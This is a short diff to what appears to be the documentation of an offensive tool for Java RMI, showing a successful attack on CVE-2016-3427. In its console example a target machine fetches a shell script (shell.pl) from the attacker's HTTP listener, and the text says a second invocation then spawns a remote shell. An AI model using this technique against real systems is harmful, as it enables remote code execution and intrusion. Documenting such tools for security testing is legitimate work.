@@ -290,9 +290,9 @@ The following example shows an successful attack on *CVE-2016-3427*:
 On the *HTTP listener* you will get the corresponding request:
 
 ```console
-[qtc@kali ~]$ python3 -m http.server
+[qtc@kali www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [24/Sep/2020 17:00:02] "GET /shell.pl HTTP/1.1" 200 -
+172.17.0.2 - - [02/Oct/2020 07:43:33] "GET /shell.pl HTTP/1.1" 200 -
 ```
 
 Now you can spawn the shell with a second invocation:
